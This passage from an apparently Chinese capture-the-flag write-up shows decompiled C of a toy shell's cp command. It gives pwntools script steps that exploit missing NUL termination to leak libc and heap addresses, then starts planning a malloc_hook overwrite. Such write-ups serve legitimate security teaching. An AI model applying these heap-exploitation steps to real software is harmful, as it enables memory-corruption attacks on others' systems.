class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">acp</span><span class=\"params\">(<span class=\"type\">char</span> **cmd)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *v2; <span class=\"comment\">// rsp</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> v5; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6[<span class=\"number\">3</span>]; <span class=\"comment\">// [rsp+8h] [rbp-B0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> **comment; <span class=\"comment\">// [rsp+20h] [rbp-98h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v8; <span class=\"comment\">// [rsp+29h] [rbp-8Fh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v9; <span class=\"comment\">// [rsp+2Ah] [rbp-8Eh]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10; <span class=\"comment\">// [rsp+2Bh] [rbp-8Dh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+2Ch] [rbp-8Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> nums; <span class=\"comment\">// [rsp+30h] [rbp-88h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v13; <span class=\"comment\">// [rsp+34h] [rbp-84h]</span></span><br><span class=\"line\">  file *<span class=\"built_in\">list</span>; <span class=\"comment\">// [rsp+38h] [rbp-80h] BYREF</span></span><br><span class=\"line\">  file *destination; <span class=\"comment\">// [rsp+40h] [rbp-78h] BYREF</span></span><br><span class=\"line\">  file *copied_file; <span class=\"comment\">// [rsp+48h] [rbp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *s1; <span class=\"comment\">// [rsp+50h] [rbp-68h]</span></span><br><span class=\"line\">  file *curops; <span class=\"comment\">// [rsp+58h] [rbp-60h]</span></span><br><span class=\"line\">  file *ptr; <span class=\"comment\">// [rsp+60h] [rbp-58h]</span></span><br><span class=\"line\">  __int64 v20; <span class=\"comment\">// [rsp+68h] [rbp-50h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *dest; <span class=\"comment\">// [rsp+70h] [rbp-48h]</span></span><br><span class=\"line\">  file *curr; <span class=\"comment\">// [rsp+78h] [rbp-40h]</span></span><br><span class=\"line\">  file *temp; <span class=\"comment\">// [rsp+80h] [rbp-38h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> delim[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+8Eh] [rbp-2Ah] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v25; <span class=\"comment\">// [rsp+90h] [rbp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  comment = cmd;</span><br><span class=\"line\">  v25 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  curops = cuurr_pos;</span><br><span class=\"line\">  destination = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  copied_file = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  ptr = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v8 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v9 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(delim, <span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">    ++i;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( comment[i] );</span><br><span class=\"line\">  nums = i - <span class=\"number\">1</span>;</span><br><span class=\"line\">  v13 = <span class=\"built_in\">strlen</span>(comment[i - <span class=\"number\">1</span>]);</span><br><span class=\"line\">  v20 = v13 + <span class=\"number\">1</span> - <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  v6[<span class=\"number\">0</span>] = v13 + <span class=\"number\">1</span>;</span><br><span class=\"line\">  v6[<span class=\"number\">1</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">16</span> * ((v6[<span class=\"number\">0</span>] + <span class=\"number\">15</span>) / <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v6 != (v6 - (v1 &amp; <span class=\"number\">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  v2 = alloca(v1 &amp; <span class=\"number\">0xFFF</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (v1 &amp; <span class=\"number\">0xFFF</span>) != <span class=\"number\">0</span> )</span><br><span class=\"line\">    *(&amp;v6[<span class=\"number\">-1</span>] + (v1 &amp; <span class=\"number\">0xFFF</span>)) = *(&amp;v6[<span class=\"number\">-1</span>] + (v1 &amp; <span class=\"number\">0xFFF</span>));</span><br><span class=\"line\">  dest = v6;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: missing destination file operand after &#x27;%s&#x27;\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(dest, comment[nums]);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( s1 = strtok(dest, delim); ; s1 = strtok(<span class=\"number\">0LL</span>, delim) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !s1 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( i = <span class=\"number\">1</span>; i &lt; nums; ++i )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        copied_file = curops-&gt;firstson;</span><br><span class=\"line\">        v9 = findfile(&amp;copied_file, comment[i]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 != <span class=\"number\">1</span> || !checkfile(copied_file) )<span class=\"comment\">// 未找到 ，或者不是个文件</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, comment[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;                                       <span class=\"comment\">// 索引最后一个file</span></span><br><span class=\"line\">          destination = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">          v8 = findfile(&amp;destination, comment[i]);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            copy(copied_file, destination);     <span class=\"comment\">// 文件复制到其他位置</span></span><br><span class=\"line\">            cuurr_pos = curops;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            curr = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">            temp = calloc40();</span><br><span class=\"line\">            temp-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">            copy_name(temp, copied_file-&gt;name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( copied_file-&gt;context )</span><br><span class=\"line\">              copycontext(copied_file, temp);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">              temp-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( curr )</span><br><span class=\"line\">              link(curr, temp);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">              cuurr_pos-&gt;firstson = temp;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(s1, <span class=\"string\">&quot;.&quot;</span>) )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">LABEL_32:</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(s1, off_4077) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">list</span> = cuurr_pos-&gt;firstson;</span><br><span class=\"line\">  v10 = findfile(&amp;<span class=\"built_in\">list</span>, s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v10 != <span class=\"number\">1</span> || !checkfolder(<span class=\"built_in\">list</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: target &#x27;%s&#x27; is not a directory\\n&quot;</span>, comment[nums]);</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    cuurr_pos = <span class=\"built_in\">list</span>;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nums != <span class=\"number\">2</span> )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  v4 = v13;</span><br><span class=\"line\">  v5 = <span class=\"built_in\">strlen</span>(s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(&amp;dest[v4 - v5], s1) )</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  copied_file = curops-&gt;firstson;</span><br><span class=\"line\">  destination = curops-&gt;firstson;</span><br><span class=\"line\">  v9 = findfile(&amp;copied_file, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v9 != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: cannot stat &#x27;%s&#x27;: No such file or directory\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    cuurr_pos = curops;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !checkfile(copied_file) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;ezbash: -r not specified; omitting directory &#x27;%s&#x27;\\n&quot;</span>, comment[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    cuurr_pos = curops;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = findfile(&amp;destination, s1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( checkfolder(destination) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      cuurr_pos = destination;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( checkfile(destination) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      copy(copied_file, destination);</span><br><span class=\"line\">      cuurr_pos = curops;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_32;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ptr = calloc40();</span><br><span class=\"line\">  ptr-&gt;flag = <span class=\"number\">1</span>;</span><br><span class=\"line\">  copy_name(ptr, comment[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( copied_file-&gt;context )</span><br><span class=\"line\">    copycontext(copied_file, ptr);</span><br><span class=\"line\">  link(cuurr_pos-&gt;firstson, ptr);</span><br><span class=\"line\">  cuurr_pos = curops;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1LL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">copy</span><span class=\"params\">(file *src, file *des)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  file *dest; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  dest = des;</span><br><span class=\"line\">  result = src;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( src != des &amp;&amp; (src-&gt;context || (result = des-&gt;context) != <span class=\"number\">0LL</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class=\"comment\">// 文件复制到文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v4 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">        v5 = <span class=\"built_in\">strlen</span>(des-&gt;context);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v4 &gt; v5 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          dest = <span class=\"built_in\">realloc</span>(des-&gt;context, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v4 + <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">memset</span>(des-&gt;context, <span class=\"number\">0</span>, v5);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        result = <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span>                                      <span class=\"comment\">// 没有context</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        result = src-&gt;context;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( result )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          result = des-&gt;context;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !result )</span><br><span class=\"line\">            result = copycontext(src, des);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(des-&gt;context);</span><br><span class=\"line\">      result = des;</span><br><span class=\"line\">      des-&gt;context = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">copycontext</span><span class=\"params\">(file *src, file *dest)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"built_in\">strlen</span>(src-&gt;context);</span><br><span class=\"line\">  dest-&gt;context = <span class=\"built_in\">malloc</span>(v3);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(dest-&gt;context, <span class=\"number\">0</span>, v3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncpy</span>(dest-&gt;context, src-&gt;context, v3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里 echo 是的我们的 context 大小是固定的，但是这里我们可以 malloc 指定的大小，大小根据我们拷问的文件内容的长度计算。另外一点，cp 不会向目标额外写入空字符。</p>\n<h3 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h3>\n<p>这是一个很无语的过程，因为 echo 的话，一定会清空数据。所以就是利用 cp，把 unsortedbins 的 chunk 申请出来，因为 copycontext 不会清空 chunk。所以我们申请一个 0x8，因为不会写入空字符，就可以把 unsortedbins 申请出来的堆块的前八字节覆盖，到那时保留了 bk 指针，同时也跟前八字节组成新的字符串。这样就泄露了 libc 的地址。为了方便，我们把要拷贝的文件的 context 的 chunksize 写大一点，后面会比较方便。入下面的 cccc 文件，context 的 chunksize=0x551</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;cccc&#x27;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">touch(<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3f2</span>,<span class=\"string\">b&quot;BBBB&quot;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;../&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;c&#x27;</span>*<span class=\"number\">0x3f0</span>,<span class=\"string\">b&quot;cccc&quot;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;d&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">libcbase  = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3ebca0</span> +<span class=\"number\">0x1ff0c0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">malloc_hook = libcbase + <span class=\"number\">0x1ecb70</span>-<span class=\"number\">0x23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"泄露堆地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露堆地址\">#</a> 泄露堆地址</h3>\n<p>有了上面的思路，泄露堆地址也很容易，glibc2.31 存在 tchche, 拷贝一字节，就可以申请一个 0x20 的 chunk，所以提前布局 2 个 0x20 的 chunk. 申请到的 tache chunk 的 fd 就不为空，我们只需要低位的几个字节就可以，我布局的两个 chunk 很近，我只要覆盖最低字节。然后就泄露了堆地址。值得一提的是，2.31 的 tcache 的 bk 指针指向 tcache，但是申请出来的时候，会自动清空 bk。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak the chunk addr</span></span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">mkdir(<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;ii&#x27;</span>)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">rmv(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">cd(<span class=\"string\">b&#x27;../&#x27;</span>)</span><br><span class=\"line\">echo(<span class=\"string\">b&#x27;\\x70&#x27;</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">cp(<span class=\"string\">b&#x27;dddd&#x27;</span>,<span class=\"string\">b&#x27;AAAA&#x27;</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">cd(<span class=\"string\">b&quot;AAAA&quot;</span>)</span><br><span class=\"line\">cat(<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">heap_addr = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">0x001470</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"最后的攻击\"><a class=\"markdownIt-Anchor\" href=\"#最后的攻击\">#</a> 最后的攻击</h3>\n<p>现在 libc 的地址有了，如何实现任意地址写，因为保护全开，优先考虑了 malloc_hook + onegadget 的攻击</p>\n<p>问题来了，如何实现任意地址写？unlink 的攻击无法布局 fakechunk (因为地址只有 6 字节，我们只能写入一个地址)。</p>\n<p>基本的攻击手法必要前提在哪里，溢出，UAF,</p>\n<p>任意地址写，要么我们拿到任意地址的 fakechunk，要么修改文件的 context 的指针，然后 echo 或者 cp。</p>\n<p>我们伪造一个 fakechunk 的可能性不大，所以我们要修改 context 指针。这样的话，没有 uaf，那就考虑 overlap。</p>\n<p>关键点来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 